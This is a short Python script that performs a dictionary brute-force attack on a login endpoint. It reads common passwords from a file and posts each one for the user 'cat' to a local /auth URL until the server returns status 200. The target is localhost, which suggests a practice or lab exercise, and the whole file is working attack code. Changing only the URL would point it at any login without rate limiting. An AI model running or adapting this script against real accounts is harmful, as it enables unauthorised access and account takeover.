import requests

with open('bad_passwords.txt') as f:
    popular_passwords_data = f.read()

popular_passwords = popular_passwords_data.split('\n')

i = 0


def generate_bad_passwords():
    global i
    if i >= len(popular_passwords):
        return
    password = popular_passwords[i]
    i += 1
    return password


while True:
    password = generate_bad_passwords()
    if password is None:
        break

    data = {'login': 'cat', 'password': password}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print('Success!', password)
        break
